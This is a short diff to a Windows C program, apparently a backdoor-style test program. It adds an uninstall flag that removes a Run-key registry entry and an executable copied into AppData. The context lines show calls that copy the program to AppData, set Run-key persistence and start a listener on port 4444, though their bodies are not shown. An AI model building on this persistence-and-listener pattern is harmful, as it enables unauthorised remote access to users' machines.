@@ -8,8 +8,6 @@
 #include <windows.h>
 #include <shlobj.h>
 
-#pragma comment(lib, "ws2_32.lib")
-
 #define PORT 4444
 #define BUFF_SIZE 1024
 
@@ -63,7 +61,23 @@ void start_listener() {
     WSACleanup();
 }
 
-int main() {
+int main(int argc, char *argv[]) {
+    // command line option to uninstall
+    if (argc > 1 && strcmp(argv[1], "-u") == 0) {
+        HKEY hKey;
+        char path[MAX_PATH];
+
+        SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, path);
+        strcat(path, "\\test_program.exe");
+
+        RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
+        RegDeleteValue(hKey, "TestProgram");
+        RegCloseKey(hKey);
+
+        remove(path);
+        return 0;
+    }
+
     copy_to_appdata();
     set_registry_run();
     start_listener();
